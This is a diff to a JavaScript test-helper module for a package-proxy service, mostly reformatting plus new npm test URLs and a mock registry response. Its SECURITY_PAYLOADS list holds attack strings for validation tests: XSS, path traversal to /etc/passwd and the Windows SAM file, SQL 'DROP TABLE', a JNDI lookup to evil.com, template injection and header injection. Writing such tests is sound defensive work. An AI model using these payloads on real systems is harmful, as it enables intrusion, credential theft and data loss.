@@ -13,7 +13,7 @@ export function createMockRequest(url, options = {}) {
     method: 'GET',
     headers: {
       'User-Agent': 'Mozilla/5.0 (Test)',
-      'Accept': '*/*'
+      Accept: '*/*'
     }
   };
 
@@ -45,9 +45,7 @@ export function createMockResponse(body = 'OK', options = {}) {
  * @returns {Request} Git request object
  */
 export function createGitRequest(url, service = 'git-upload-pack') {
-  const gitUrl = url.includes('?') 
-    ? `${url}&service=${service}` 
-    : `${url}?service=${service}`;
+  const gitUrl = url.includes('?') ? `${url}&service=${service}` : `${url}?service=${service}`;
 
   return new Request(gitUrl, {
     method: service === 'git-upload-pack' ? 'GET' : 'POST',
@@ -97,7 +95,10 @@ export const TEST_URLS = {
   npm: {
     package: 'https://example.com/npm/react',
     tarball: 'https://example.com/npm/react/-/react-18.2.0.tgz',
-    scoped: 'https://example.com/npm/@types/node'
+    scoped: 'https://example.com/npm/@types/node',
+    // Test case for the specific npm package that caused the issue
+    npmPackage: 'https://example.com/npm/npm',
+    npmTarball: 'https://example.com/npm/npm/-/npm-11.5.1.tgz'
   },
   pypi: {
     simple: 'https://example.com/pypi/simple/requests/',
@@ -119,7 +120,7 @@ export const SECURITY_PAYLOADS = {
     '<script>alert(1)</script>',
     'javascript:alert(1)',
     '"><script>alert(1)</script>',
-    '\';alert(1);//'
+    "';alert(1);//"
   ],
   pathTraversal: [
     '../../../etc/passwd',
@@ -127,12 +128,7 @@ export const SECURITY_PAYLOADS = {
     '..\\..\\..\\windows\\system32\\config\\sam',
     '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
   ],
-  injection: [
-    '\'; DROP TABLE users; --',
-    '${jndi:ldap://evil.com}',
-    '{{7*7}}',
-    '<%=7*7%>'
-  ],
+  injection: ["'; DROP TABLE users; --", '${jndi:ldap://evil.com}', '{{7*7}}', '<%=7*7%>'],
   headerInjection: [
     'value\r\nX-Injected: malicious',
     'value\nX-Injected: malicious',
@@ -158,13 +154,13 @@ export class PerformanceTestHelper {
     const start = performance.now();
     const result = await fn();
     const end = performance.now();
-    
+
     this.measurements.push({
       name,
       duration: end - start,
       timestamp: Date.now()
     });
-    
+
     return result;
   }
 
@@ -184,7 +180,7 @@ export class PerformanceTestHelper {
   getAverageDuration(name) {
     const filtered = this.measurements.filter(m => m.name === name);
     if (filtered.length === 0) return 0;
-    
+
     const total = filtered.reduce((sum, m) => sum + m.duration, 0);
     return total / filtered.length;
   }
@@ -216,6 +212,32 @@ export function mockFetch(url, options = {}) {
       }
     }, 10);
   });
+}
+
+/**
+ * Create a mock npm registry response
+ * @param {string} packageName - Package name
+ * @param {string} version - Package version
+ * @returns {Object} Mock npm registry response
+ */
+export function createMockNpmRegistryResponse(packageName, version = '1.0.0') {
+  return {
+    name: packageName,
+    versions: {
+      [version]: {
+        name: packageName,
+        version: version,
+        dist: {
+          tarball: `https://registry.npmjs.org/${packageName}/-/${packageName}-${version}.tgz`,
+          shasum: 'mock-shasum',
+          integrity: 'mock-integrity'
+        }
+      }
+    },
+    'dist-tags': {
+      latest: version
+    }
+  };
 }
 
 /**
